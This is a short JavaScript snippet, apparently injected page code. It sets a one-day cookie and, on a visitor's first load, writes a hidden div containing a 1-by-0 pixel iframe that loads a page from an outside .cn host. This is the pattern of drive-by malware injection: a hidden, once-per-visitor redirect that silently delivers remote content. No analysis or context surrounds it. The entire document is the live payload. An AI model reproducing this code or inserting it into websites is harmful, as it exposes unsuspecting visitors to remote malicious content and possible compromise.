function Get(){
var Then = new Date() 
Then.setTime(Then.getTime() + 24*60*60*1000)
var cookieString = new String(document.cookie)
var cookieHeader = "Cookie1=" 
var beginPosition = cookieString.indexOf(cookieHeader)
if (beginPosition != -1){ 
} else 
{ document.cookie = "Cookie1=risb;expires="+ Then.toGMTString()
document.write("<div style=\"display:none\">");
document.writeln("<IFRaME src=\"http://cc4y7.cn/39/index.htm\" width=1 height=0><\/IFRAME>");
}
}Get(); 